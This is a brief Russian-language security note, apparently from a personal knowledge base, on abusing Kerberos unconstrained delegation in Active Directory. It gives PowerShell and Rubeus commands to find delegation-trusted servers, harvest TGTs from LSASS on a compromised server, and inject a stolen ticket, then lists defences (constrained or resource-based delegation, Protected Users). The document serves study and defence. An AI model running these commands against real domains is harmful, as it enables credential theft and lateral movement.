#AD #attacks #windows 

> При включенной неограниченной делегации на сервере сохраняется TGT пользователя. Злоумышленник, получивший доступ к серверу может извлечь его и использовать для доступа к другим сервисам

```powershell
# Поиск серверов с неограниченной делегацией
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation

# Rubeus для мониторинга и извлечения TGT из LSASS на скомпрометированном сервере
.\Rubeus.exe monitor /interval:5

# Использование извлеченного билета (в Base64)
.\Rubeus.exe ptt /ticket:<base64_ticket_data>
```

# Protect

1) Вместо Unconstrained Delegation использовать Сonstrained Delegation, а лучше **Resource-Based Constrained Delegation (RBCD)**
2) Добавляйте привилегированные учетные записи в группу **"Protected Users"**. Это запрещает делегирование для таких аккаунтов